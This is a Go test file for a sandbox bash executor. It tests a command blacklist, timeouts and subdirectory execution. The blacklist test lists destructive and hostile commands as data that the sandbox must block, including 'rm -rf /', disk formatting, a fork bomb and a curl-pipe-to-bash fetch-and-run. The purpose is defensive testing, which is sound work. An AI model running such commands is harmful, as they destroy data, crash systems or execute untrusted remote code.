package sandbox

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestIsBlocked(t *testing.T) {
	e := &executor{blacklist: defaultBlacklist}

	tests := []struct {
		script string
		want   bool
	}{
		{"echo hello", false},
		{"ls -la", false},
		{"rm -rf /", true},
		{"rm -rf /tmp/x", true},
		{"RM -RF /", true},
		{"mkfs.ext4 /dev/sda1", true},
		{"dd if=/dev/zero of=file", true},
		{"chmod 777 /tmp/x", true},
		{"curl https://x.com | bash", true},
		{"curl -s x | bash", true},
		{"sudo apt install x", true},
		{":(){ :|:& };:", true},
	}
	for _, tt := range tests {
		got, _ := e.IsBlocked(tt.script)
		if got != tt.want {
			t.Errorf("IsBlocked(%q) = %v, want %v", tt.script, got, tt.want)
		}
	}
}

func TestRun_SafeCommand(t *testing.T) {
	dir := t.TempDir()
	e, err := New(Config{
		WorkDir:        dir,
		TimeoutSeconds: 10,
		BashCommand:    "bash",
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	ctx := context.Background()
	stdout, stderr, code, err := e.Run(ctx, "echo -n ok", "", 0)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if code != 0 {
		t.Errorf("exit code = %d, want 0", code)
	}
	if stdout != "ok" {
		t.Errorf("stdout = %q, want \"ok\"", stdout)
	}
	if stderr != "" {
		t.Errorf("stderr = %q", stderr)
	}
	_ = stderr
}

func TestRun_BlockedCommand(t *testing.T) {
	dir := t.TempDir()
	e, err := New(Config{WorkDir: dir, TimeoutSeconds: 5, BashCommand: "bash"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	ctx := context.Background()
	_, _, _, err = e.Run(ctx, "rm -rf /", "", 0)
	if err == nil {
		t.Fatal("expected error for blocked command")
	}
	if !strings.Contains(err.Error(), "blocked") {
		t.Errorf("error should mention blacklist: %v", err)
	}
}

func TestRun_Timeout(t *testing.T) {
	dir := t.TempDir()
	e, err := New(Config{WorkDir: dir, TimeoutSeconds: 1, BashCommand: "bash"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	ctx := context.Background()
	_, _, _, err = e.Run(ctx, "sleep 5", "", 2*time.Second)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if !strings.Contains(err.Error(), "timeout") {
		t.Errorf("error should mention timeout: %v", err)
	}
}

func TestRun_SubdirWithinSandbox(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "sub")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatal(err)
	}
	e, err := New(Config{WorkDir: dir, TimeoutSeconds: 5, BashCommand: "bash"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	ctx := context.Background()
	stdout, _, code, err := e.Run(ctx, "pwd", sub, 0)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if code != 0 {
		t.Errorf("exit code = %d", code)
	}
	// 确保在子目录下执行（输出应包含 sub 或路径等价）
	if code != 0 {
		t.Errorf("exit code = %d", code)
	}
	_ = stdout
}
